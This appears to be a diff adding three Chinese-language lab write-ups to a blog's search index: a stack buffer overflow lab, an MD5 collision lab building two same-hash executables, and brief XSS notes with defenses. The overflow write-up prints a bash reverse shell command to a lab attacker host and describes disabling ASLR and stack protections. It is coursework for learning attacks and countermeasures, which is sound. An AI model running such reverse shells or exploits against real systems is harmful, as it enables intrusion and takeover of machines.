@@ -4,6 +4,162 @@
   
     
     <entry>
+      <title>栈溢出</title>
+      <link href="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+      <url>/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>缓冲区溢出</p><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p><p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-实验环境准备："><a href="#一、-实验环境准备：" class="headerlink" title="一、   实验环境准备："></a>一、   实验环境准备：</h1><ol><li>在开始这个实验之前，我们需要确保关闭地址随机化对策，否则，攻击将很困难。可以使用以下命令执行此操作，以后便于不断调试：   <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121043134.png" alt="image-20231011121043134"></li></ol><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121106389.png" alt="image-20231011121106389"></p><ol start="2"><li>阅读server.c明白实验环境原理：</li></ol><p>关键代码解释：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121117177.png" alt="image-20231011121117177"> </p><p>上述代码表示在建立了链接以后，创建了一个子进程，子进程使用 dup2 将标准输入重定向到与客户端通信的套接字。也就是说，标准输入内容由远程用户决定，这也是我们可以利用的地方。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121124037.png" alt="image-20231011121124037"></p><p>上述代码表示：通过 execle 执行程序 “stack”，并传递随机生成的环境变量数组。</p><p>总体功能：此程序创建了一个基于TCP的服务器，监听指定端口（9090），用于接受连接并在子进程中执行名为 “stack” 的程序，这个服务器还试图在生成子进程时随机生成一些环境变量，以增加栈的随机性。</p><ol start="3"><li>阅读并理解stack.c程序：</li></ol><p>这个实验室中使用的易受攻击的程序名为 stack.c，位于服务器代码文件夹中。这个程序有一个缓冲区溢出漏洞，我们的目的式利用这个漏洞并获得根特权。以下是部分stack.c代码：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121147825.png" alt="image-20231011121147825"></p><p>代码解释：上述程序有缓冲区溢出漏洞。它从标准输入中读取数据，然后将数据传递给函数 bof ()中的另一个缓冲区。原始输入的最大长度可以是517字节，但是 bof ()中的缓冲区只有 BUF SIZE 字节长，小于517。因为 strcpy ()不检查边界，所以会发生缓冲区溢出。因此可以在分配给buffer大小以外的部分构造攻击代码，溢出部分拥有当前用户权限来执行指令。</p><ol start="4"><li>编译</li></ol><p>编译stack.c文件，只不过还需要使用-fno-stack-protector 和 -z execstack来关闭堆栈保护器和不可执行的堆栈保护。（已写入makefile）</p><p>接下来make一下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121205120.png" alt="image-20231011121205120"></p><ol start="5"><li>创建容器，启动并检查：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121213119.png" alt="image-20231011121213119"></p><p>创建成功：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121218555.png" alt="image-20231011121218555"></p><p>启动容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121224725.png" alt="image-20231011121224725"></p><p>现在四个服务均正常启动</p><p>关闭容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121230224.png" alt="image-20231011121230224"></p><p>至此环境准备完成。</p><h1 id="二、-TASK1：熟悉ShellCode"><a href="#二、-TASK1：熟悉ShellCode" class="headerlink" title="二、   TASK1：熟悉ShellCode"></a>二、   TASK1：熟悉ShellCode</h1><ol><li>阅读通用的shellcode代码（32位为例）：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121243242.png" alt="image-20231011121243242"></p><p>根据实验手册解释，Shell 代码运行“&#x2F;bin&#x2F;bash”shell 程序 ，但它有两个参数“-c”和一个命令字符串(红框部分)。这表明 shell 程序将运行第二个参数中的命令。这些字符串末尾的 * 只是一个占位符，在执行 shell 代码期间，它将被一个0x00字节替换。</p><ol start="2"><li>实现删除功能：</li></ol><p>先新建一个测试删除的文件“test.txt”：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121254930.png" alt="image-20231011121254930"></p><p>修改shellcode的命令，其中要注意的是，由于 argv []数组的占位符的起始位置(就在命令字符串之后)是在 shell 代码的二进制部分中硬编码的，即已经被写死，所以*的位置要保持不变：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121315030.png" alt="image-20231011121315030"></p><ol start="3"><li>测试删除功能：</li></ol><p>根据readme的提示进行操作：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121324922.png" alt="image-20231011121324922"></p><h1 id="三、-Task-2-Level-1-Attack"><a href="#三、-Task-2-Level-1-Attack" class="headerlink" title="三、   Task 2: Level-1 Attack"></a>三、   Task 2: Level-1 Attack</h1><ol><li>环境准备，启动docker中的第一个server，ip端口为：10.9.0.5 9090：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121335941.png" alt="image-20231011121335941"></p><ol start="2"><li>良性消息测试：输入hello字符串查看正常输出，观察ebp的值：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121341808.png" alt="image-20231011121341808"></p><ol start="3"><li>构造攻击文件（32位）：</li></ol><p>Step1：先测试exploit.py生成的badfile在server中的情况如何：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121352447.png" alt="image-20231011121352447"></p><p>Setp2：画出函数调用的栈帧图：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121400111.png" alt="image-20231011121400111"></p><p>利用shellcode的最核心一点就是在执行完函数以后，esp+4（指向返回地址的下一个地址）是固定的指令，而它刚好可以让esp回到父函数栈顶；ret一执行，程序就会跳到esp所指位置，而实验所给的shellcode填充的是NOP指令，也就是会cpu什么也不做，一直跳转下一条指令，所以只要shellcode的返回地址足够高，就一定会被执行到。。</p><p>Step3：分析得出在exploit.py中需要修改的参数</p><p>​     Ret为shellcode的入口地址：ebp+8（或更高）</p><p>​     Offset为ret的偏移值：ebp-buffer+4</p><p>​     Start：517-len(shellcode)，把badfile中的后面部分替换为攻击代码</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121411812.png" alt="image-20231011121411812"></p><p>修改shellcode中的内容，模仿task1输入：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121420264.png" alt="image-20231011121420264"></p><p>Step4：在执行一次脚本文件，生成新的badfile，并输入给服务器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121426149.png" alt="image-20231011121426149"></p><p>\4. Reverse shell：</p><p>上述操作只能够执行shell中固定的指令，所以需要把shellcode改为 reverseshell，使得远程用户可以拿到目标主机的root权限：</p><p>Step1：修改bash为</p><p>“&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1      *”</p><p>&#x2F;bin&#x2F;bash -i: 启动一个交互式的 Bash shell。-i 选项表示交互式模式，即用户可以输入命令并获取输出。</p><p>&gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090：将标准输出重定向到攻击者主机的9090端口</p><p>0&lt;&amp;1：表示将用户的标准输入重定向到标准输出</p><p>2&gt;&amp;1：表示将用户的标准错误输出也重定向到标准输出</p><p>而标准输出有重定向到了tcp链接，也就是到了攻击者的主机端口上，这样只要服务端点击了我们上传的badfile他就会自己建立tcp连接，我们就拿到了root权限的shell：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121436878.png" alt="image-20231011121436878"></p><p>Step2：新开一个终端，作为攻击者 开放9090端口，一直监听，等待服务器连接：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121441370.png" alt="image-20231011121441370"></p><p>还可以测试一下是否拿到了权限，结果是肯定的：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121448578.png" alt="image-20231011121448578"></p><h1 id="四、-Task3：Level-2-Attack"><a href="#四、-Task3：Level-2-Attack" class="headerlink" title="四、   Task3：Level-2 Attack"></a>四、   Task3：Level-2 Attack</h1><ol><li>上传良性字符串到10.9.0.6中，查看打印信息：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121457578.png" alt="image-20231011121457578"></p><p>只能看到buffer的起始地址而无法得知ebp的值,也就无法定位ret的地址。</p><ol start="2"><li>根据题目要求，我们知道buffer的范围[100,300]，那么offset就应该在[104,304]之间，且最终的ret地址应该是4的倍数，由于整个shellcode的结构中：ret往高地址方向全部填充的式NOP指令，是无效的，会一直往下面跳转，所以保证返回地址&gt;&#x3D;buf_addr+308,就能够保证eip一定会指向NOP指令或shellcode指令入口处，即使跳转到了NOP所在地址，也一定会执行到shellcode，所以在整个范围中全部填充为ret。</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121508846.png" alt="image-20231011121508846"></p><ol start="3"><li>同样的方法创建反弹shell：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121527603.png" alt="image-20231011121527603"></p><h1 id="五、-Task-4-Level-3-Attack"><a href="#五、-Task-4-Level-3-Attack" class="headerlink" title="五、   Task 4: Level-3 Attack"></a>五、   Task 4: Level-3 Attack</h1><ol><li><p>这个任务中32位字变成了64位字，原理都一样，但是正如手册指出，难点在于虽然机器支持64位字，但是最大只能到：0x00007FFFFFFFFFFF，也就是会出现00 00，而scrapy遇到0就停止复制，所以我们需要把想办法解决这个问题。</p></li><li><p>先照常输入查看打印信息：</p></li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121541707.png" alt="image-20231011121541707"></p><ol start="3"><li>目前想到的解决办法是：在截断之前，就把shellcode全部拷贝进去，此时ret指向前面的shellcode地址，也就是可以改变start的值，不让他在末尾填充，而在一开始填充，ret就是buffer_addr+start。Exploit4.py如下：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121550601.png" alt="image-20231011121550601"></p><p>反弹shell实验如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121602353.png" alt="image-20231011121602353"></p><h1 id="六、-Task-5-Level-4-Attack"><a href="#六、-Task-5-Level-4-Attack" class="headerlink" title="六、   Task 5: Level-4 Attack"></a>六、   Task 5: Level-4 Attack</h1><ol><li>本任务中，buffer的大小变小，打印：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121611023.png" alt="image-20231011121611023"></p><p>只相差了96字节，而上一问打印除了shellcode的长度为165字节，显然已经超过了。所以不适于将shellcode放进缓冲区，而放在ret段后面又会被截断，所以采取直接指向原数组中shellcode的地址，因此尽可能将ret设置大一点，跳转到数据段的shellcode代码部分执行shellcode，代码中打印了一下ret的类型以及十六进制值。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121617494.png" alt="image-20231011121617494"></p><h1 id="七、-Task-6-Experimenting-with-the-Address-Randomization"><a href="#七、-Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="七、   Task 6: Experimenting with the Address Randomization"></a>七、   Task 6: Experimenting with the Address Randomization</h1><ol><li>关闭地址随机化：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121626703.png" alt="image-20231011121626703"></p><ol start="2"><li>向server1多次发送连接：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121633606.png" alt="image-20231011121633606"></p><ol start="3"><li>所以只能采取固定返回地址，不断尝试直到连接上目标主机为止，即可运行实验中提供的brute-force.sh：</li></ol><p>就使用原来的exploit.py来尝试：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121642500.png" alt="image-20231011121642500"></p><p>在此只尝试了3分钟就停止了，因为已经感受到了开启随机地址化后，必然将对于缓冲区域溢出攻击产生极大阻碍。</p><h1 id="八、-Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#八、-Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="八、   Tasks 7: Experimenting with Other Countermeasures"></a>八、   Tasks 7: Experimenting with Other Countermeasures</h1><ol><li>栈溢出保护</li></ol><p>根据实验手册，gcc提供了一种栈保护机制，在开启栈保护机制以后来观察现象：</p><p>首先关闭-fno-stack-protector：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121654532.png" alt="image-20231011121654532"></p><p>重新执行exploit.py生成badfile，将其复制到server-code中，在把badfile作为标准输入，：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121702274.png" alt="image-20231011121702274"></p><p>结果如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121711740.png" alt="image-20231011121711740"></p><ol start="2"><li>栈不可执行</li></ol><p>编译call_shellcode.c时不使用-z execstack </p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121748889.png" alt="image-20231011121748889"></p><p>重新make，在再执行a32.out：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121745086.png" alt="image-20231011121745086"></p><p>出现段错误。这不能避免缓冲区溢出，只是禁止了shellcode的执行。</p><blockquote><p>这里的shellcode使用的是NOP雪橇，实现shellcode的方法还有很多，比如使用jmp esp指令等</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 栈溢出，shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MD5碰撞</title>
+      <link href="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/"/>
+      <url>/2023/10/11/MD5%E7%A2%B0%E6%92%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>实验3：MD5碰撞试验</p><p>a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"><a href="#一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况" class="headerlink" title="一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"></a>一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况</h1><ol><li>创建一个text文本，利用md5collgen生成两个文件：</li></ol><p>命令为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113844687.png" alt="image-20231011113844687">                              </p><p>文件内容为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113851441.png" alt="image-20231011113851441"></p><ol start="2"><li>利用工具产生两个文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113913173.png" alt="image-20231011113913173"></p><ol start="3"><li>再查看out1.bin和out2.bin的md5码，发现二者值相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113920547.png" alt="image-20231011113920547"></p><ol start="4"><li>再利用bless十六进制编辑器查看二者的十六进制编码：</li></ol><p>命令为：</p><p>   <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113929606.png" alt="image-20231011113929606"></p><p>Out1.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113934815.png" alt="image-20231011113934815"></p><p>Out2.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113941637.png" alt="image-20231011113941637"></p><p>观察得出前缀相同(都是text.txt)，填充内容有不同之处(但是md5相同)</p><p>这与md5collgen的工作原理有关。具体来说，这个工具可以提供生成相同前缀的文件的功能，它从”text.txt”文件中提取前缀，并在必要时对前缀进行零填充，以确保其长度为64的倍数。然后，md5collgen用这些前缀生成两个输出文件，这两个文件的内容都包含在生成的128字节中，但它们之间存在部分差异。具体来说md5collgen通过相同前缀生成MD5相同的文件原理如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113949253.png" alt="image-20231011113949253"></p><ol start="5"><li>最后验证两个文件是否相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113956726.png" alt="image-20231011113956726"></p><p>这证明了两个文件是不同的。</p><h1 id="二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"><a href="#二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。" class="headerlink" title="二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"></a>二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</h1><ol><li>先观察Lab3_task2.c源代码文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114003609.png" alt="image-20231011114003609"></p><p>其功能为：将某个字符串以16进制的形式进行打印，中间的数组需要自己填充。</p><ol start="2"><li><p>MD5原理解释：</p><p>  a)  MD5是一个相当复杂的算法，但从很高的层次来看，它并不复杂。MD5将输入数据分成64字节的块，然后在这些块上迭代计算散列。MD5算法的核心是一个压缩函数，它接受两个输入，一个64字节的数据块和前一次迭代的结果。压缩函数产生一个128位的 IHV，它代表“中间散列值”; 这个输出然后被反馈到下一次迭代中。如果当前迭代是最后一次迭代，则 IHV 将是最终的散列值。第一次迭代的 IHV 输入(IHV0)是一个固定值，具体原理如下图所示：</p></li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114025720.png" alt="image-20231011114025720"></p><p>​b)  MD5 碰撞具有添加后缀依然碰撞的性质: 若 hash(A)&#x3D;hash(B)，则 hash(A+S)&#x3D;hash(B+S) 但是并不满足增加前缀的性质，即 hash(A)&#x3D;hash(B)推不出 hash(S+A)&#x3D;hash(S+B)</p><ol start="3"><li>根据MD5的原理和弱抗碰撞性，可以找到一个构造思路：</li></ol><p>​a)  md5collgen可以构造出前缀相同且MD5相同的两个文件，且其后面填充的128个字节不同：</p><p>​        i.    MD5（perfix||P）&#x3D;MD5（perfix||Q）</p><p>​b)  MD5具有添加后缀依然碰撞的性质，所以可以构造两条消息,使得他们具有相同的前缀和后缀，即我们在数组当中需要去寻找到对应的前缀部分（64字节）中间的128字节，以及后缀，构造消息如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114050051.png" alt="image-20231011114050051"></p><p>​        i.    即：MD5（perfix||P||suffix）&#x3D;MD5（perfix||Q||suffix）</p><ol start="4"><li>具体实验步骤如下：</li></ol><p>​a)  首先在xyz数组中填上一些随机值，这里选择全部填为A（ASCLL码&#x3D;0x41），这样便于在bless中查找文件内容位置：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114114808.png" alt="image-20231011114114808"></p><p>​b)  Gcc编译运行文件</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114127917.png" alt="image-20231011114127917"></p><p>​c)  通过bless十六进制编辑器查看Lab3_task2定位字符串部分：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114135127.png" alt="image-20231011114135127"></p><p>​     再定位到A开头的字节偏移位置为：0x3020即第12320个字节</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114143590.png" alt="image-20231011114143590"></p><p>​d)  定位前后缀位置：</p><p>​        i.    由于开头是第12320个字节，寻找最近的64的倍数为：12352，所以确定了前缀分割点为第12352个字节；往后移128个字节，得到第二个分割点为：第12481个字节。</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114150718.png" alt="image-20231011114150718"></p><p>​e)  通过md5collgen利用先前的到的perfix生成两个MD相同的文件，再使用cat吧后缀suffix拼接到后面：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114156546.png" alt="image-20231011114156546"></p><p>​f)  对文件赋予执行权限后输出，验证二者的MD5码是否相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114215801.png" alt="image-20231011114215801"></p><p>对比输出，文件不同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114223076.png" alt="image-20231011114223076"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114228155.png" alt="image-20231011114228155"></p><p>再查看文件的MD5码，发现相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114233791.png" alt="image-20231011114233791"></p><h1 id="三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"><a href="#三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。" class="headerlink" title="三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"></a>三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</h1><ol><li>观察task3的伪代码：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114243058.png" alt="image-20231011114243058"></p><p> 他要求我们实现的功能为：设定两个数组，若两个数组内容相同，则执行正常代码；否则，执行恶意代码，对应了题目要求的代码行为不同。</p><ol start="2"><li>构造思路：</li></ol><p>​a)  根据第二问的经验，我们仍然采取切片拼接的方式完成第三问，即将X与Y数组填充相同的值，再在bless中去找到对应的X、Y数组部分。通过切片构造两个可执行文件，其中一个执行后输出benign，另一组则输出malicious。</p><p>​b)  针对连个代码的构造方式如下图所示：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114258858.png" alt="image-20231011114258858"></p><p>上边一组表示X Y数组相同，执行benign；</p><p>下边一组表示X Y数组不同，执行malicious，P、Q表示由md5collgen生成的两个md5值相同的文件的不同部分。</p><ol start="3"><li>操作步骤：</li></ol><p>​a)  针对X、Y数组，首先填充相同的值，使他们一致，代码改动如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114338990.png" alt="image-20231011114338990"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114345729.png" alt="image-20231011114345729"></p><p>​b)  编译源代码，运行结果如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114351418.png" alt="image-20231011114351418"></p><p>可见，运行出来是正常代码。</p><p>​c)  利用bless查看数组的位置仍然是0x3020</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114404185.png" alt="image-20231011114404185"></p><p>​d)  确定切片的位置，前缀为第12352个字节，从gcc开始的那个字节（即第12745）开始往后作为suffix，通过head与tail命令进行处理：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114412923.png" alt="image-20231011114412923"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114416894.png" alt="image-20231011114416894"></p><p>​e)  通过md5collgen生成两个MD5相同的文件prefix1_task3、prefix2_task3：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114423269.png" alt="image-20231011114423269"></p><p>​f)  把prefix1_task3 中数组 X的后32个字节+128(md5填充物)&#x3D;160个字节截取出来作为 middle_task3，得到新数组Z：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114437810.png" alt="image-20231011114437810"></p><p>​g)  由于Z的长度为160，还差40个字节才满40，所以需要填充40个字节，这里利用python去构造这40个字节：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114442199.png" alt="image-20231011114442199"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114447282.png" alt="image-20231011114447282"></p><p>去除末尾的0A：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114453429.png" alt="image-20231011114453429"></p><p>​h)  最后发现XY之间差了24个字节，对间隔的部分构造：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114459549.png" alt="image-20231011114459549"></p><p>​i)  由此得到了所有构造的部分：</p><p>Benign： prefix1_task3 pure40 pure24 middle_task3  pure40  后缀：suffix_task3</p><p>Malicious:  prefix2_task3 pure40 pure24  middle_task3 pure40 后缀：suffix_task3</p><p>​j)  拼接两组代码并修改执行权限：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114521644.png" alt="image-20231011114521644"></p><p>​k)  比较运行结果：</p><p>MD5值相同：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114545435.png" alt="image-20231011114545435"></p><p>​        运行结果：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114552554.png" alt="image-20231011114552554"></p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114558443.png" alt="image-20231011114558443"></p><h1 id="四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"><a href="#四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？" class="headerlink" title="四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"></a>四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</h1><p>a) 相同的MD5值：截取第64位倍数的字节作为前缀，通过md5collgen就能够生产相同MD5的两个不同文件，文件不同的部分在前缀之后，利用这个工具就能很快找到MD5（M）&#x3D;MD5（N）的M与N，以后的切片与构造均在这两个文件的基础上。</p><p>b) 不同的行为：其实本质上来说，就是要构造两个二进制编译后的可执行文件，我们利用源代码通过gcc编译后的文件进行切片构造重组。输出benign的那一个编译后的可执行文件对应的两个数组是相同的；输出为malicious的那一个编译后的可执行文件两个数组是不同的。并且这里有一个细节就是当利用md5collgen工具产生了两个不同文件以后，X数组已经改变，所以为了保证benign的正常输出，一定要注意需要用这个文件来切片重构Y数组的代码，不能够保持不变。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 攻防 </tag>
+            
+            <tag> MD5 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss攻击</title>
+      <link href="/2023/10/09/xss%E6%94%BB%E5%87%BB/"/>
+      <url>/2023/10/09/xss%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>引诱用户点击按钮，实现漏洞利用</p><ul><li>反弹xss</li><li>存储xss</li><li>DOM xss<ul><li>DOM的使用可以让代码和数据分离</li><li>DOM的使用导致搜索引擎引流不够</li><li>DOM的使用会更加安全</li><li>今天的解决方法：对用户输入进行检测</li></ul></li></ul><h1 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h1><ul><li>攻击负载（ｐａｙｌｏａｄ）如何传输</li><li>攻击负载（ｐａｙｌｏａｄ）存储在哪里</li></ul><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><ul><li>ｃｏｏｋｉｅ开启ｈｔｔｐｏｎｌｙ</li><li>CSP</li></ul>]]></content>
+      
+      
+      <categories>
+          
